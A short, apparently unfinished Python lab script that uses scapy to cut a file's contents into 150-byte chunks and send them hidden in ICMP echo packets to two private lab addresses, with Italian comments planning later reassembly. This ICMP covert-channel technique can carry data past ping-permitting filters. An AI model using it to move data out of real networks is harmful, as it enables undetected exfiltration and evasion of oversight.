#https://www.geeksforgeeks.org/working-with-pdf-files-in-python/

from scapy.all import *
import math
from pypdf import PdfReader

def sanitize(s: str) -> str: 
    return s.replace(" ", "_")

#ip = "192.168.56.101"
lista_destinazioni = ["192.168.56.101", "192.168.56.102"]

file="payload.txt"  
stringa=None
with open(file, "r") as f:
    stringa = f.read()
    print(stringa)
stringa=sanitize(stringa)

block=150 #dimensione in byte del blocco
for i in range(0,len(stringa),block): 
    print("Carattere {car} mandato a {ip}".format(
        car=stringa[i:i+block], 
        ip=lista_destinazioni[i%len(lista_destinazioni)]
    ))
    destinazione=lista_destinazioni[i%len(lista_destinazioni)]

    sequenza=math.ceil(i/block) 
    pkt = IP(dst=destinazione)/ICMP(seq=sequenza) / stringa[i:i+block]
    ans = sr1(pkt, timeout=2, verbose=1)

    #if ans:
        #print(f"{ip} is alive")
        #ans.show()
    #else:
        #print(f"{ip} is not responding")
        #print("No reply")

#Metodo per poi ricombinare i dati e inviare anche il tempo in cui vengono inviati. 
# aggiungere un tempo interno o definire la sequenza dei pacchetti
